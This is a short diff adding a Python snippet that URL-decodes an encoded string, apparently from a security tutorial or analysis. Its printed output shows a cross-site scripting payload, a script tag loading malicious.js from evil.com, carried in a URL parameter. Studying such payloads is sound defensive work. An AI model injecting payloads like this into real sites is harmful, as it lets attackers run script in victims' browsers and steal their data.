@@ -1,0 +1,4 @@
+from urllib.parse import unquote #'Unquote' in the library for decoding.
+Decoded_Payload = unquote(Encoded_url) #Encoded Value
+print(Decoded_Payload) #Decoded value
+>http://dummy/getdb.php?data=<script src="http://www.evil.com/malicious.js"></script>
